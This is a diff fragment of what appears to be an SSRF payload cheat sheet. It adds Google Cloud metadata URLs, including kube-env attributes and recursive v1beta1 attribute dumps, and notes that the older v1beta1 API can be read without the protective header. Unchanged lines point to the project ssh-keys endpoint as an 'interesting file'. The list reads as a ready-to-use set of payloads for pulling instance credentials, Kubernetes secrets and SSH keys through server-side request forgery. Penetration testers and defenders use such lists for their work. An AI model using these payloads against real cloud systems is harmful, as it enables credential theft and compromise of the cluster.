@@ -8,10 +8,16 @@ http://metadata/computeMetadata/v1/
 http://metadata.google.internal/computeMetadata/v1/instance/hostname
 http://metadata.google.internal/computeMetadata/v1/instance/id
 http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
 Google allows recursive pulls
 http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
 http://metadata.google.internal/computeMetadata/v1beta1/
 http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
+http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json
+	--https://cloud.google.com/compute/docs/metadata
+	---Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True" on API v1
+	---Most endpoints can be accessed via the v1beta API without a header
+
 
 Interesting files:
 http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
